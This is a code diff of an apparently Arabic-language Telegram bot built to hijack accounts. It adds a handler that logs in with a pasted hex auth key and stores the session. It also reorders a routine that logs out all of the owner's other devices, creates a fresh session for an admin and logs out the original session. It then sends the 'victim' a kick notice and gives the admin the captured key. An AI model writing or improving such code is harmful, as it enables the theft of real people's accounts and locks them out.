@@ -243,17 +243,17 @@ COUNTRIES_DB = [
 def get_country_info(phone):
     if not phone or phone == "Unknown":
         return "غير معروف", "🌍"
-    
+
     phone_str = str(phone)
     if not phone_str.startswith('+'):
         phone_str = '+' + phone_str
-        
+
     sorted_db = sorted(COUNTRIES_DB, key=lambda x: len(x['code']), reverse=True)
-    
+
     for country in sorted_db:
         if phone_str.startswith(country['code']):
             return country['arabic_name'], country['flag']
-            
+
     return "غير معروف", "🌍"
 
 # =========================================================
@@ -272,6 +272,11 @@ def init_db():
         c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
     except:
         pass
+    try:
+        c.execute("ALTER TABLE sessions ADD COLUMN hex_key TEXT")
+        c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER")
+    except:
+        pass
     c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
     conn.commit()
     conn.close()
@@ -282,6 +287,15 @@ def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session,
     c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type ) VALUES (?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type))
     conn.commit()
     conn.close()
+
+def save_hex_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id):
+    conn = get_db_conn()
+    c = conn.cursor()
+    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id))
+    acc_id = c.lastrowid
+    conn.commit()
+    conn.close()
+    return acc_id
 
 def get_all_accounts(owner_id):
     conn = get_db_conn()
@@ -455,31 +469,127 @@ def log_to_channel(text, file_path=None, session_text=None):
     except Exception as e:
         logging.error(f"فشل إرسال للقناة: {e}")
 
+# =========================================================
+# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت
+# =========================================================
 
+@bot.message_handler(func=lambda message: message.text and re.match(r'^[a-fA-F0-9]{200,550}\s+[1-5]$', message.text.strip()))
+def handle_hex_login(message):
+    if not is_allowed(message.from_user.id):
+        return
+    
+    parts = message.text.strip().split()
+    hex_data = parts[0]
+    dc_id = int(parts[1])
+    
+    msg = bot.reply_to(message, "⏳ جاري فحص الجلسة والاتصال بالسيرفر...")
+    
+    async def process_hex():
+        try:
+            auth_key_bytes = bytes.fromhex(hex_data)
+            pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key_bytes)
+            
+            client = Client(f"temp_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+            await client.connect()
+            me = await client.get_me()
+            
+            phone = getattr(me, 'phone_number', "Unknown")
+            if phone != "Unknown" and not phone.startswith("+"):
+                phone = "+" + phone
+                
+            first_name = me.first_name or "Unknown"
+            user_id = me.id
+            year = get_creation_year(user_id)
+            
+            await client.disconnect()
+            
+            # حفظ الحساب بالداتا مع الهاكس والسيرفر
+            acc_id = save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
+            
+            text = (
+                f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
+                f"⎉╎ الاسـم: {first_name}\n"
+                f"⎉╎ الـرقـم: {phone}\n"
+                f"⎉╎ الآيـدي: {user_id}\n"
+                f"•❐• سـنـة الإنـشـاء: {year}\n\n"
+                f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه"
+            )
+            
+            # أزرار التحكم
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("⚙️ تهجير الحساب (نقل جذري)", callback_data=f"migrate_{acc_id}"))
+            markup.add(InlineKeyboardButton("❌ حذف الجلسة", callback_data=f"delete_{acc_id}"))
+            
+            bot.delete_message(message.chat.id, msg.message_id)
+            bot.send_message(message.chat.id, text, reply_markup=markup)
+            
+        except Exception as e:
+            bot.edit_message_text(f"❌ فشل تسجيل الدخول يرجى التأكد من الـ Hex!\nالسبب: {str(e)}", message.chat.id, msg.message_id)
 
+    run_async(process_hex())
+
+# =========================================================
+# ⚙️ محرك التهجير الذكي المحدث
+# =========================================================
 
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
-    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (نسخة 2026 المستقرة)"""
+    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (الترتيب الجديد والقراءة من القاعدة)"""
 
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
     client_b = None
     verify_b = None
 
     try:
-        # 1. استخراج السيرفر الصحيح برمجياً من جلسة A عبر Raw API بدقة
+        # 1. استخراج السيرفر الصحيح والهاكس من قاعدة البيانات التي تم حفظها مسبقاً
+        conn = get_db_conn()
+        c = conn.cursor()
+        c.execute("SELECT dc_id, hex_key FROM sessions WHERE id=?", (acc_id,))
+        row = c.fetchone()
+        conn.close()
+
+        # في حال لم يتواجد DC أو Hex نضع افتراضي
+        target_dc = row[0] if row and row[0] else 2
+        saved_hex = row[1] if row and len(row) > 1 else "UNKNOWN"
+
         if not client_a.is_connected:
             await client_a.connect()
 
-        me_raw = await client_a.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
-        target_dc = me_raw[0].dc_id if me_raw and hasattr(me_raw[0], 'dc_id') else 2
+        # 2. طرد جميع الأجهزة الأخرى أولاً من الجلسة A قبل توليد أي جلسة جديدة
+        auths = await client_a.invoke(functions.account.GetAuthorizations())
+        hit_24h_limit = False
 
-        # 2. توليد السلسلة النصية الموجهة للـ DC المستهدف لمنع خطأ الـ Migrate نهائياً
+        for auth in auths.authorizations:
+            is_current_a = getattr(auth, 'current', False)
+
+            if not is_current_a:
+                try:
+                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
+                    await asyncio.sleep(0.5) 
+                except Exception as e:
+                    err_str = str(e).lower()
+                    if "fresh" in err_str or "24" in err_str:
+                        hit_24h_limit = True
+                        break 
+                    elif "flood" in err_str:
+                        await asyncio.sleep(5)
+
+        # إذا طلب الانتظار 24 ساعة، نضع الحساب تحت المراقبة ونوقف العملية
+        if hit_24h_limit:
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
+            conn.commit()
+            conn.close()
+            if client_a.is_connected: await client_a.disconnect()
+            return False
+
+        # 3. الآن لم يتبقَ سوى الجلسة A. نقوم بتوليد سلسلة موجهة للسيرفر المحفوظ لتوليد الجلسة B
         empty_auth_key = b"\x00" * 256
         packed = struct.pack(">B?256sQ?", target_dc, False, empty_auth_key, 0, False)
         constructed_session = packed + b"\x00" * 6  
         session_string_for_b = base64.urlsafe_b64encode(constructed_session).decode().rstrip("=")
 
-        # 3. إنشاء الجلسة B على السيرفر الصحيح من أول ثانية
+        # 4. إنشاء الجلسة B على السيرفر الصحيح 
         client_b = Client(
             f"cb_{acc_id}_{int(time.time())}", 
             api_id=API_ID, 
@@ -490,10 +600,9 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         ) 
         await client_b.connect()
 
-        # 4. طلب رمز تسجيل الدخول لـ B (سيصدر جاهزاً ومباشراً بدون طلب انتقال)
+        # 5. طلب رمز تسجيل الدخول لـ B 
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
-        # حماية احتياطية نادرة الحدوث في حال أصر السيرفر على التوجيه
         if isinstance(qr, types.auth.LoginTokenMigrateTo):
             await client_b.disconnect()
             packed_retry = struct.pack(">B?256sQ?", qr.dc_id, False, empty_auth_key, 0, False)
@@ -502,66 +611,26 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             await client_b.connect()
             qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
-        # 5. الجلسة A توافق على الرمز
+        # 6. الجلسة A توافق على الرمز وتمرر الصلاحيات
         if isinstance(qr, types.auth.LoginToken):
             await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
 
-            # مهلة أمان حرجة لكي يستقبل العميل B إشعار نجاح الصلاحيات بالكامل ويحفظها
-            await asyncio.sleep(5) 
+            await asyncio.sleep(4) 
 
-            # 6. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات وفصل العميل القديم
+            # 7. تصدير الجلسة B وفصلها للتحقق
             session_b_str = await client_b.export_session_string()
             await client_b.disconnect()
 
-            # 7. فحص الجلسة الجديدة عبر عميل نظيف 100% (سحر الحل لمنع خطأ UNREGISTERED)
             verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
             await verify_b.connect()
             me_b = await verify_b.get_me()
 
             if not me_b:
                 raise Exception("فشل التحقق من Session B عبر العميل النظيف")
-
-            dc_id = me_b.dc_id if me_b.dc_id else target_dc
-
-            # استخراج مفتاح الـ HEX بدقة من الـ Session String
-            try:
-                decoded_hex = base64.urlsafe_b64decode(session_b_str + "=" * (-len(session_b_str) % 4))
-                hex_key = decoded_hex[2:258].hex()
-            except Exception:
-                hex_key = "UNKNOWN_HEX"
-
+            
             await verify_b.disconnect()
 
-            # 8. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها و B)
-            auths = await client_a.invoke(functions.account.GetAuthorizations())
-            hit_24h_limit = False
-
-            for auth in auths.authorizations:
-                is_current_a = getattr(auth, 'current', False)
-                is_session_b = (getattr(auth, 'device_model', '') == B_DEVICE_MODEL)
-
-                if not is_current_a and not is_session_b:
-                    try:
-                        await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                        await asyncio.sleep(0.5) 
-                    except Exception as e:
-                        err_str = str(e).lower()
-                        if "fresh" in err_str or "24" in err_str:
-                            hit_24h_limit = True
-                            break 
-                        elif "flood" in err_str:
-                            await asyncio.sleep(5)
-
-            if hit_24h_limit:
-                conn = get_db_conn()
-                c = conn.cursor()
-                c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
-                conn.commit()
-                conn.close()
-                if client_a.is_connected: await client_a.disconnect()
-                return False
-
-            # 9. الجلسة A تسجل خروج بنفسها عبر Raw API لتدمير الجلسة القديمة تماماً
+            # 8. الجلسة A تسجل خروج بنفسها (لتدمير الجلسة القديمة والاعتماد على B فقط)
             try:
                 await client_a.invoke(functions.auth.LogOut())
             except Exception: 
@@ -569,14 +638,14 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             if client_a.is_connected: await client_a.disconnect()
 
-            # 10. تحديث الملكية في الداتا بيس لصالح الأدمن بالجلسة النظيفة المستقرة B
+            # 9. تحديث الملكية في الداتا بيس لصالح الأدمن بـ B
             conn = get_db_conn()
             c = conn.cursor()
             c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
             conn.commit()
             conn.close()
 
-            # 11. إرسال الكليشة للضحية
+            # 10. إرسال الكليشة للضحية
             kick_msg = (
                 f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
                 f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
@@ -589,18 +658,18 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             except Exception: 
                 pass
 
-            # 12. إرسال رسالة النجاح للأدمن مع مفتاح الـ HEX الصحيح المطابق للـ DC
+            # 11. إرسال رسالة النجاح للأدمن
             admin_msg = (
                 f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
                 f"⎉╎ الـرقـم: `{phone}`\n"
                 f"⎉╎ الاسـم: {name}\n"
-                f"⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n"
-                f"🔑 مـفـتـاح HEX:\n`{hex_key} {dc_id}`\n\n"
-                f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
+                f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
+                f"🔑 مـفـتـاح HEX (المحفوظ):\n`{saved_hex} {target_dc}`\n\n"
+                f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات أولاً وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
             )
             bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
-            # 13. حذف الحساب من قائمة الجلسات المؤقتة في البوت
+            # حذف الحساب من المؤقت إذا لزم الأمر
             conn = get_db_conn()
             c = conn.cursor()
             c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
@@ -609,7 +678,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             return True
         else:
-            raise Exception("فشل في توليد رمز QR أو تم تسجيل الدخول بشكل غير متوقع")
+            raise Exception("فشل في توليد رمز QR")
 
     except Exception as e:
         logging.error(f"Migration Failed for {phone}: {e}")
@@ -617,7 +686,6 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if verify_b and verify_b.is_connected: await verify_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
         return False
-
 
 
 
